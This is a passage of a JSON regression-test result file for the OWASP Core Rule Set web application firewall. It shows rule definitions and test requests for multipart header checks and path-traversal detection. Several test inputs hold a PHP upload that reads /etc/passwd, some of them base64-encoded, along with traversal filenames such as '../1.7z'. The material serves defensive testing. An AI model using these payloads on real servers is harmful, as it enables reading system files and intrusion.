    "tested_rule" : [ "SecRule TX:/paramcounter_.*/ \"@gt 1\" \"id:921180,\\\n  phase:2,\\\n  block,\\\n  msg:'HTTP Parameter Pollution (%{MATCHED_VAR_NAME})',\\\n  logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-protocol',\\\n  tag:'paranoia-level/3',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/PROTOCOL-ATTACK',\\\n  tag:'capec/1000/152/137/15/460',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.http_violation_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl3=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "922100",
    "test_id" : 2,
    "test_path" : "REQUEST-922-MULTIPART-ATTACK/922100.yaml",
    "description" : "Negative test: only allowed charsets when using _charset_",
    "cause" : "failed no_expect_ids check: 922100 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=922100 - Multipart content type global _charset_ definition is not allowed by policy" ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "Negative test: only allowed charsets when using _charset_",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "multipart/form-data; boundary=boundary",
            "Accept" : "*/*"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "--boundary\nContent-disposition: form-data; name=\"_charset_\"\n\nutf-8\n--boundary\nContent-disposition: form-data; name=\"negative\"\nContent-Type: text/plain\n\nThis should be good as we use utf-8 that is allowed.\n--boundary--\n"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 922100 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule &MULTIPART_PART_HEADERS:_charset_ \"!@eq 0\" \"id:922100,\\\n  phase:2,\\\n  block,\\\n  t:none,\\\n  msg:'Multipart content type global _charset_ definition is not allowed by policy',\\\n  logdata:'Matched Data: %{ARGS._charset_}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-multipart-header',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/MULTIPART-ATTACK',\\\n  tag:'capec/1000/255/153',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.922100_charset=|%{ARGS._charset_}|',\\\n  chain\"", "SecRule TX:922100_CHARSET \"!@within %{tx.allowed_request_content_type_charset}\" \"t:lowercase,\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "922130",
    "test_id" : 1,
    "test_path" : "REQUEST-922-MULTIPART-ATTACK/922130.yaml",
    "description" : "Positive test: special character in multipart header.\nRequest is a multipart request with 2 Content-Disposition headers,\nwhere the first one contains a 0x0E character at the first position.\n--boundary\n\\x0EContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Disposition: form-data; name=\"post\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\"));\n--boundary--\n",
    "cause" : "nothing checked for test 1",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Positive test: special character in multipart header.\nRequest is a multipart request with 2 Content-Disposition headers,\nwhere the first one contains a 0x0E character at the first position.\n--boundary\n\\x0EContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Disposition: form-data; name=\"post\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\"));\n--boundary--\n",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "encoded_request" : "UE9TVCAvcG9zdCBIVFRQLzEuMQ0KQWNjZXB0OiAqLyoNCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LUxlbmd0aDogMTg2DQpDb250ZW50LVR5cGU6IG11bHRpcGFydC9mb3JtLWRhdGE7IGJvdW5kYXJ5PWJvdW5kYXJ5DQpIb3N0OiBsb2NhbGhvc3QNClVzZXItQWdlbnQ6IE9XQVNQIENSUyB0ZXN0IGFnZW50DQoNCi0tYm91bmRhcnkNCg5Db250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImZpbGUiOyBmaWxlbmFtZT0iMS5waHAiDQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InBvc3QiDQoNCjw/cGhwIHZhcl9kdW1wKGZpbGVfZ2V0X2NvbnRlbnRzKCIvZXRjL3Bhc3N3ZCIpKTsNCi0tYm91bmRhcnktLQ=="
        },
        "output" : {
          "log" : {
            "match_regex" : "Multipart parsing error: Multipart: Invalid part header \\(contains invalid character\\)|\\[id \"922130\"\\].*\\[msg \"Multipart header contains characters outside of valid range\"\\]"
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule MULTIPART_PART_HEADERS \"@rx [^\\x21-\\x7E][\\x21-\\x39\\x3B-\\x7E]*:\" \"id:922130,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:lowercase,\\\n  msg:'Multipart header contains characters outside of valid range',\\\n  logdata:'Matched Data: %{TX.0}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-multipart-header',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/MULTIPART-ATTACK',\\\n  tag:'capec/272/220',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "922130",
    "test_id" : 2,
    "test_path" : "REQUEST-922-MULTIPART-ATTACK/922130.yaml",
    "description" : "Positive test: special character in multipart header.\nRequest is a multipart request with 2 Content-Disposition headers,\nwhere the first one contains a 0x0E character at the last position.\n--boundary\nContent-Disposition\\x0E: form-data; name=\"file\"; filename=\"1.php\"\nContent-Disposition: form-data; name=\"post\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\"));\n--boundary--\n",
    "cause" : "nothing checked for test 2",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "Positive test: special character in multipart header.\nRequest is a multipart request with 2 Content-Disposition headers,\nwhere the first one contains a 0x0E character at the last position.\n--boundary\nContent-Disposition\\x0E: form-data; name=\"file\"; filename=\"1.php\"\nContent-Disposition: form-data; name=\"post\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\"));\n--boundary--\n",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "encoded_request" : "UE9TVCAvcG9zdCBIVFRQLzEuMQ0KQWNjZXB0OiAqLyoNCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LUxlbmd0aDogMTg2DQpDb250ZW50LVR5cGU6IG11bHRpcGFydC9mb3JtLWRhdGE7IGJvdW5kYXJ5PWJvdW5kYXJ5DQpIb3N0OiBsb2NhbGhvc3QNClVzZXItQWdlbnQ6IE9XQVNQIENSUyB0ZXN0IGFnZW50DQoNCi0tYm91bmRhcnkNCkNvbnRlbnQtRGlzcG9zaXRpb24OOiBmb3JtLWRhdGE7IG5hbWU9ImZpbGUiOyBmaWxlbmFtZT0iMS5waHAiDQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InBvc3QiDQoNCjw/cGhwIHZhcl9kdW1wKGZpbGVfZ2V0X2NvbnRlbnRzKCIvZXRjL3Bhc3N3ZCIpKTsNCi0tYm91bmRhcnktLQ=="
        },
        "output" : {
          "log" : {
            "match_regex" : "Multipart parsing error: Multipart: Invalid part header \\(contains invalid character\\)|\\[id \"922130\"\\].*\\[msg \"Multipart header contains characters outside of valid range\"\\]"
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule MULTIPART_PART_HEADERS \"@rx [^\\x21-\\x7E][\\x21-\\x39\\x3B-\\x7E]*:\" \"id:922130,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:lowercase,\\\n  msg:'Multipart header contains characters outside of valid range',\\\n  logdata:'Matched Data: %{TX.0}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-multipart-header',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/MULTIPART-ATTACK',\\\n  tag:'capec/272/220',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "922130",
    "test_id" : 3,
    "test_path" : "REQUEST-922-MULTIPART-ATTACK/922130.yaml",
    "description" : "Negative test: no special character in multipart header",
    "cause" : "nothing checked for test 3",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 3,
      "desc" : "Negative test: no special character in multipart header",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "multipart/form-data; boundary=boundary",
            "Accept" : "*/*"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "--boundary\nContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\")); ?>\n--boundary--\n"
        },
        "output" : {
          "log" : {
            "no_match_regex" : "Multipart parsing error: Multipart: Invalid part header \\(contains invalid character\\)|\\[id \"922130\"\\].*\\[msg \"Multipart header contains characters outside of valid range\"\\]"
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule MULTIPART_PART_HEADERS \"@rx [^\\x21-\\x7E][\\x21-\\x39\\x3B-\\x7E]*:\" \"id:922130,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:lowercase,\\\n  msg:'Multipart header contains characters outside of valid range',\\\n  logdata:'Matched Data: %{TX.0}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-multipart-header',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/MULTIPART-ATTACK',\\\n  tag:'capec/272/220',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "922130",
    "test_id" : 4,
    "test_path" : "REQUEST-922-MULTIPART-ATTACK/922130.yaml",
    "description" : "Positive test: special character in multipart header.\nRequest is a multipart request with 2 Content-Disposition headers,\nwhere the first one contains a 0x20 character, the last invalid character before the valid range.\n--boundary\nContent-\\x20Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Disposition: form-data; name=\"post\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\"));\n--boundary--\n",
    "cause" : "nothing checked for test 4",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 4,
      "desc" : "Positive test: special character in multipart header.\nRequest is a multipart request with 2 Content-Disposition headers,\nwhere the first one contains a 0x20 character, the last invalid character before the valid range.\n--boundary\nContent-\\x20Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Disposition: form-data; name=\"post\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\"));\n--boundary--\n",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "encoded_request" : "UE9TVCAvcG9zdCBIVFRQLzEuMQ0KQWNjZXB0OiAqLyoNCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LUxlbmd0aDogMTg2DQpDb250ZW50LVR5cGU6IG11bHRpcGFydC9mb3JtLWRhdGE7IGJvdW5kYXJ5PWJvdW5kYXJ5DQpIb3N0OiBsb2NhbGhvc3QNClVzZXItQWdlbnQ6IE9XQVNQIENSUyB0ZXN0IGFnZW50DQoNCi0tYm91bmRhcnkNCkNvbnRlbnQtIERpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImZpbGUiOyBmaWxlbmFtZT0iMS5waHAiDQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InBvc3QiDQoNCjw/cGhwIHZhcl9kdW1wKGZpbGVfZ2V0X2NvbnRlbnRzKCIvZXRjL3Bhc3N3ZCIpKTsNCi0tYm91bmRhcnktLQ=="
        },
        "output" : {
          "log" : {
            "match_regex" : "Multipart parsing error: Multipart: Invalid part header \\(contains invalid character\\)|\\[id \"922130\"\\].*\\[msg \"Multipart header contains characters outside of valid range\"\\]"
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule MULTIPART_PART_HEADERS \"@rx [^\\x21-\\x7E][\\x21-\\x39\\x3B-\\x7E]*:\" \"id:922130,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:lowercase,\\\n  msg:'Multipart header contains characters outside of valid range',\\\n  logdata:'Matched Data: %{TX.0}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-multipart-header',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/MULTIPART-ATTACK',\\\n  tag:'capec/272/220',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "922130",
    "test_id" : 5,
    "test_path" : "REQUEST-922-MULTIPART-ATTACK/922130.yaml",
    "description" : "Negative test: no character from outside of range in multipart header; '!' is allowed (!, the first character in the range of valid characters))",
    "cause" : "nothing checked for test 5",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 5,
      "desc" : "Negative test: no character from outside of range in multipart header; '!' is allowed (!, the first character in the range of valid characters))",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "multipart/form-data; boundary=boundary",
            "Accept" : "*/*"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "--boundary\nContent-!Disposition: form-data; name=\"file\"; filename=\"1.php\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\")); ?>\n--boundary--\n"
        },
        "output" : {
          "log" : {
            "no_match_regex" : "Multipart parsing error: Multipart: Invalid part header \\(contains invalid character\\)|\\[id \"922130\"\\].*\\[msg \"Multipart header contains characters outside of valid range\"\\]"
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule MULTIPART_PART_HEADERS \"@rx [^\\x21-\\x7E][\\x21-\\x39\\x3B-\\x7E]*:\" \"id:922130,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:lowercase,\\\n  msg:'Multipart header contains characters outside of valid range',\\\n  logdata:'Matched Data: %{TX.0}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-multipart-header',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/MULTIPART-ATTACK',\\\n  tag:'capec/272/220',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "922130",
    "test_id" : 6,
    "test_path" : "REQUEST-922-MULTIPART-ATTACK/922130.yaml",
    "description" : "Negative test: no character from outside of range in multipart header; '~' is allowed (~, the last valid character in the range of valid characters)",
    "cause" : "nothing checked for test 6",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 6,
      "desc" : "Negative test: no character from outside of range in multipart header; '~' is allowed (~, the last valid character in the range of valid characters)",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "multipart/form-data; boundary=boundary",
            "Accept" : "*/*"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "--boundary\nContent~Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Disposition: form-data; name=\"post\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\")); ?>\n--boundary--\n"
        },
        "output" : {
          "log" : {
            "no_match_regex" : "Multipart parsing error: Multipart: Invalid part header \\(contains invalid character\\)|\\[id \"922130\"\\].*\\[msg \"Multipart header contains characters outside of valid range\"\\]"
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule MULTIPART_PART_HEADERS \"@rx [^\\x21-\\x7E][\\x21-\\x39\\x3B-\\x7E]*:\" \"id:922130,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:lowercase,\\\n  msg:'Multipart header contains characters outside of valid range',\\\n  logdata:'Matched Data: %{TX.0}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-multipart-header',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/MULTIPART-ATTACK',\\\n  tag:'capec/272/220',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "922130",
    "test_id" : 7,
    "test_path" : "REQUEST-922-MULTIPART-ATTACK/922130.yaml",
    "description" : "Positive test: special character in multipart header.\nRequest is a multipart request with 2 Content-Disposition headers,\nwhere the first one contains a 0x7F character, the first invalid character after the valid range.\n--boundary\nContent\\x7F-Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Disposition: form-data; name=\"post\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\"));\n--boundary--\n",
    "cause" : "nothing checked for test 7",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 7,
      "desc" : "Positive test: special character in multipart header.\nRequest is a multipart request with 2 Content-Disposition headers,\nwhere the first one contains a 0x7F character, the first invalid character after the valid range.\n--boundary\nContent\\x7F-Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Disposition: form-data; name=\"post\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\"));\n--boundary--\n",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "encoded_request" : "UE9TVCAvcG9zdCBIVFRQLzEuMQ0KQWNjZXB0OiAqLyoNCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LUxlbmd0aDogMTg2DQpDb250ZW50LVR5cGU6IG11bHRpcGFydC9mb3JtLWRhdGE7IGJvdW5kYXJ5PWJvdW5kYXJ5DQpIb3N0OiBsb2NhbGhvc3QNClVzZXItQWdlbnQ6IE9XQVNQIENSUyB0ZXN0IGFnZW50DQoNCi0tYm91bmRhcnkNCkNvbnRlbnR/LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImZpbGUiOyBmaWxlbmFtZT0iMS5waHAiDQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InBvc3QiDQoNCjw/cGhwIHZhcl9kdW1wKGZpbGVfZ2V0X2NvbnRlbnRzKCIvZXRjL3Bhc3N3ZCIpKTsNCi0tYm91bmRhcnktLQ=="
        },
        "output" : {
          "log" : {
            "match_regex" : "Multipart parsing error: Multipart: Invalid part header \\(contains invalid character\\)|\\[id \"922130\"\\].*\\[msg \"Multipart header contains characters outside of valid range\"\\]"
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule MULTIPART_PART_HEADERS \"@rx [^\\x21-\\x7E][\\x21-\\x39\\x3B-\\x7E]*:\" \"id:922130,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:lowercase,\\\n  msg:'Multipart header contains characters outside of valid range',\\\n  logdata:'Matched Data: %{TX.0}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-multipart-header',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/MULTIPART-ATTACK',\\\n  tag:'capec/272/220',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "930110",
    "test_id" : 8,
    "test_path" : "REQUEST-930-APPLICATION-ATTACK-LFI/930110.yaml",
    "description" : "Path Traversal Attack (..\\) query string",
    "cause" : "failed expect_id check: 930110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920460 - Abnormal character escapes in request", "phase=2 rule_id=920460 - Abnormal character escapes in request", "phase=2 rule_id=920460 - Abnormal character escapes in request" ]
    },
    "test" : {
      "test_id" : 8,
      "desc" : "Path Traversal Attack (..\\) query string",
      "stages" : [ {
        "input" : {
          "dest_addr" : "localhost",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/get?arg=..\\pineapple",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 930110 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_URI_RAW|ARGS|REQUEST_HEADERS|!REQUEST_HEADERS:Referer|FILES|XML:/* \"@rx (?:(?:^|[\\x5c/;])\\.{2,3}[\\x5c/;]|[\\x5c/;]\\.{2,3}[\\x5c/;])\" \"id:930110,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:utf8toUnicode,\\\n  t:urlDecodeUni,\\\n  t:removeNulls,\\\n  t:cmdLine,\\\n  msg:'Path Traversal Attack (/../) or (/.../)',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-lfi',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-LFI',\\\n  tag:'capec/1000/255/153/126',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  multiMatch,\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.lfi_score=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "930110",
    "test_id" : 10,
    "test_path" : "REQUEST-930-APPLICATION-ATTACK-LFI/930110.yaml",
    "description" : "Path Traversal Attack (../) file upload",
    "cause" : "failed expect_id check: 930110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 10,
      "desc" : "Path Traversal Attack (../) file upload",
      "stages" : [ {
        "input" : {
          "dest_addr" : "localhost",
          "method" : "POST",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "multipart/form-data; boundary=----WebKitFormBoundaryABCDEFGIJKLMNOPQ",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/post",
          "data" : "------WebKitFormBoundaryABCDEFGIJKLMNOPQ\nContent-Disposition: form-data; name=\"file\"; filename=\"../1.7z\"\nContent-Type: application/octet-stream\n\nBINARYDATA\n------WebKitFormBoundaryABCDEFGIJKLMNOPQ--\n",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 930110 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_URI_RAW|ARGS|REQUEST_HEADERS|!REQUEST_HEADERS:Referer|FILES|XML:/* \"@rx (?:(?:^|[\\x5c/;])\\.{2,3}[\\x5c/;]|[\\x5c/;]\\.{2,3}[\\x5c/;])\" \"id:930110,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:utf8toUnicode,\\\n  t:urlDecodeUni,\\\n  t:removeNulls,\\\n  t:cmdLine,\\\n  msg:'Path Traversal Attack (/../) or (/.../)',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-lfi',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-LFI',\\\n  tag:'capec/1000/255/153/126',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  multiMatch,\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.lfi_score=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "930110",
    "test_id" : 11,
    "test_path" : "REQUEST-930-APPLICATION-ATTACK-LFI/930110.yaml",
    "description" : "Path Traversal Attack (..\\) file upload",
    "cause" : "failed expect_id check: 930110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920120 - Attempted multipart/form-data bypass", "phase=2 rule_id=920121 - Attempted multipart/form-data bypass", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 11,
      "desc" : "Path Traversal Attack (..\\) file upload",
      "stages" : [ {
        "input" : {
          "dest_addr" : "localhost",
          "method" : "POST",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "multipart/form-data; boundary=----WebKitFormBoundaryABCDEFGIJKLMNOPQ",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/post",
          "data" : "------WebKitFormBoundaryABCDEFGIJKLMNOPQ\nContent-Disposition: form-data; name=\"file\"; filename=\"..\\1.7z\"\nContent-Type: application/octet-stream\n\nBINARYDATA\n------WebKitFormBoundaryABCDEFGIJKLMNOPQ--\n",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 930110 ]
          }
        }
      } ]
    },
